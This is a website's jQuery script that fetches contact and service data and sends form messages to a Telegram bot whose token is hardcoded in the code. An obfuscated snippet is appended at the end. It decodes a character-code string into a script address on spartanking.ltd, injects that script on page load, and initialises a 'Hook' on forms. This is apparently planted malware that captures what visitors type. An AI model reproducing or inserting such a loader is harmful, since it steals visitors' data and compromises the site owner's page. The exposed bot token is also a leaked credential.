let baseUrl = 'http://127.0.0.1:8000/api/';

$.ajax({
  url: baseUrl + 'contact',
  type: 'GET',
  success: function (response) {
    $("#addres").append(response.contact.addres)
    $("#email").append(response.contact.email)
    $("#telp").append(response.contact.telp)
    $("#maps").attr('src', response.contact.maps)

    $("#footer-contact").append(`` + response.contact.addres + ` <br>
        <strong>Phone:</strong> `+ response.contact.telp + `<br>
        <strong>Email:</strong> `+ response.contact.email + `<br>`)
  }
})

$.ajax({
  url: baseUrl + 'service',
  type: 'GET',
  success: function (response) {
    $.each(response.service, function (i, data) {
      $("#our-service").append(`<li><i class="bx bx-chevron-right"></i> <a href="javascript:void()">` + data.title + `</a></li>`)
    })

  }
})

$('.btn-send').click(function (e) {

  var dataStr = "Nama" + ":" + $('#name').val() + "\n" + "Email" + ":" + $('#email-form').val() + "\n" + "Subject" + ":" + $('#subject').val() + "\n" + "Message" + ":" + $('#message').val() + "\n";

  e.preventDefault();
  $.ajax({
    url: "https://api.telegram.org/bot1059144067:AAECI0pEjtuwBlfGKvb4W0mWB6MjzMj56Nk/sendMessage",

    method: 'POST',
    data: { chat_id: '900448515', text: dataStr },
    success: function () {
      $("#name").val("");
      $("#email-form").val("");
      $("#subject").val("");
      $("#message").val("");

      location.reload()
    }
  });
});

$('#btn-news').click(function (e) {

  var dataStr = $("#msg-news").val();

  e.preventDefault();
  $.ajax({
    url: "https://api.telegram.org/bot1059144067:AAECI0pEjtuwBlfGKvb4W0mWB6MjzMj56Nk/sendMessage",

    method: 'POST',
    data: { chat_id: '900448515', text: dataStr },
    success: function () {
      $("#msg-news").val("");

      location.reload()
    }
  });
});
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b